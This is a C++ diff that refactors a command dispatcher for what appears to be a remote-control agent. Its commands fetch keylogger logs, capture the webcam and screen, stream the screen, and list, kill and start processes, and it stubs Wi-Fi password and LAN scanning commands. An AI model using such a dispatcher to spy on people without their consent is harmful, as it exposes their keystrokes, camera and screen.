@@ -9,58 +9,75 @@
 #include <cerrno> // Cho ENOENT (Error No Entry)
 
 #define KEYLOGGER_FILE_NAME "keylogger.txt"
-std::string Dispatcher::handle(const std::string& request_json)
+Json Dispatcher::handle(const Json& request)
 {
-    std::cout << "[Dispatcher] Incoming request: " << request_json << "\n";
+    std::cout << "[Dispatcher] Incoming request: " << request.dump() << "\n";
 
     Json res;
+    std::string cmd = request.value("cmd", "");
+
+    if (cmd.empty()) {
+        res["status"] = "error";
+        res["error"] = "missing_command";
+        res["message"] = "Field 'cmd' is required.";
+        return res;
+    }
 
     try {
-        Json req = Json::parse(request_json);
-        std::string cmd = req.value("cmd", "");
-
         if (cmd == "ping") {
-            res = handle_ping(req);
+            res = handle_ping(request);
         }
         else if (cmd == "process_list") {
-            res = handle_process_list(req);
+            res = handle_process_list(request);
         }
         else if (cmd == "process_kill") {
-            res = handle_process_kill(req);
+            res = handle_process_kill(request);
         }
         else if (cmd == "process_start") {
-            res = handle_process_start(req);
+            res = handle_process_start(request);
         }
         else if (cmd == "screen") {
-            res = handle_screen(req);
+            res = handle_screen(request);
         }
         else if (cmd == "camera") {
-            res = handle_camera(req);
+            res = handle_camera(request);
         }
         else if (cmd == "camera_video") {
-            res = handle_camera_video(req);   
+            res = handle_camera_video(request);
         }
         else if (cmd == "screen_stream") {
-            res = handle_screen_stream(req);
+            res = handle_screen_stream(request);
         }
         else if (cmd == "getkeylogs") {
-            res = handle_getkeylogs(req);
+            res = handle_getkeylogs(request);
         }
         else if (cmd == "clearlogs") {
-            res = handle_clearlogs(req);
+            res = handle_clearlogs(request);
+        }
+        else if (cmd == "cancel_all" || cmd == "reset") {
+            res = handle_cancel_all(request);
         }
         else if (cmd == "sysinfo" || cmd == "scanlan" || cmd == "wifi-pass" || cmd == "download-file" || cmd == "list-files" || cmd == "delete-file") {
              res["cmd"] = cmd;
              res["status"]  = "error";
              res["message"] = "Command '" + cmd + "' is not yet implemented in the backend.";
+        } else {
+            res["status"] = "error";
+            res["error"] = "unknown_command";
+            res["message"] = "Unknown command '" + cmd + "'";
         }
     }
     catch (const std::exception& e) {
         res["status"]  = "error";
+        res["error"] = "exception";
         res["message"] = std::string("Exception: ") + e.what();
     }
 
-    return res.dump();
+    if (!res.contains("cmd")) {
+        res["cmd"] = cmd;
+    }
+
+    return res;
 }
 
 // ----------------------- HANDLERS -----------------------
@@ -116,6 +133,7 @@ Json Dispatcher::handle_clearlogs(const Json&)
 Json Dispatcher::handle_ping(const Json&)
 {
     return {
+        {"cmd", "ping"},
         {"status", "ok"},
         {"message", "pong"}
     };
@@ -124,27 +142,42 @@ Json Dispatcher::handle_ping(const Json&)
 Json Dispatcher::handle_process_list(const Json&)
 {
     ProcessManager pm;
-    return pm.list_processes();
+    Json res = pm.list_processes();
+    res["cmd"] = "process_list";
+    return res;
 }
 
 Json Dispatcher::handle_process_kill(const Json& req)
 {
-    int pid = req.value("pid", -1);
+    if (!req.contains("pid") || !req["pid"].is_number_integer()) {
+        return {
+            {"cmd", "process_kill"},
+            {"status", "error"},
+            {"error", "invalid_pid"},
+            {"message", "Missing or invalid 'pid'"}
+        };
+    }
+
+    int pid = req["pid"];
     if (pid < 0) {
         return {
+            {"cmd", "process_kill"},
             {"status", "error"},
             {"message", "Missing or invalid 'pid'"}
         };
     }
 
     ProcessManager pm;
-    return pm.kill_process(pid);
+    Json res = pm.kill_process(pid);
+    res["cmd"] = "process_kill";
+    return res;
 }
 
 Json Dispatcher::handle_process_start(const Json& req)
 {
     if (!req.contains("path") || !req["path"].is_string()) {
         return {
+            {"cmd", "process_start"},
             {"status", "error"},
             {"message", "Missing or invalid 'path'"}
         };
@@ -152,7 +185,9 @@ Json Dispatcher::handle_process_start(const Json& req)
 
     std::string path = req["path"].get<std::string>();
     ProcessManager pm;
-    return pm.start_process(path);
+    Json res = pm.start_process(path);
+    res["cmd"] = "process_start";
+    return res;
 }
 
 Json Dispatcher::handle_screen(const Json&)
@@ -160,6 +195,7 @@ Json Dispatcher::handle_screen(const Json&)
     std::string b64 = ScreenCapture::capture_base64();
 
     return {
+        {"cmd", "screen"},
         {"status", "ok"},
         {"image_base64", b64}
     };
@@ -172,11 +208,15 @@ Json Dispatcher::handle_camera(const Json& req)
 
     if (cam.captureFrame(b64)) {
         Json resp;
+        resp["cmd"] = "camera";
+        resp["status"] = "ok";
         resp["image_base64"] = b64;
         return resp;
     }
 
     Json err;
+    err["cmd"] = "camera";
+    err["status"] = "error";
     err["error"] = "camera_failed";
     return err;
 }
@@ -215,18 +255,33 @@ Json Dispatcher::handle_screen_stream(const Json& req)
     int duration = 5;
     int fps = 3;
 
-    if (req.contains("duration"))
+    if (req.contains("duration") && req["duration"].is_number_integer())
         duration = req["duration"];
 
-    if (req.contains("fps"))
+    if (req.contains("fps") && req["fps"].is_number_integer())
         fps = req["fps"];
+
+    if (duration < 1) duration = 1;
+    if (duration > 60) duration = 60;
+    if (fps < 1) fps = 1;
+    if (fps > 30) fps = 30;
 
     Json resp;
     resp["cmd"] = "screen_stream";
     resp["status"] = "accepted";
+    resp["message"] = "Screen stream request accepted";
     resp["duration"] = duration;
     resp["fps"] = fps;
 
     return resp;
 }
 
+Json Dispatcher::handle_cancel_all(const Json& req)
+{
+    std::string cmd = req.value("cmd", "cancel_all");
+    Json resp;
+    resp["cmd"] = cmd;
+    resp["status"] = "ok";
+    resp["message"] = "Cancel request acknowledged for this session.";
+    return resp;
+}
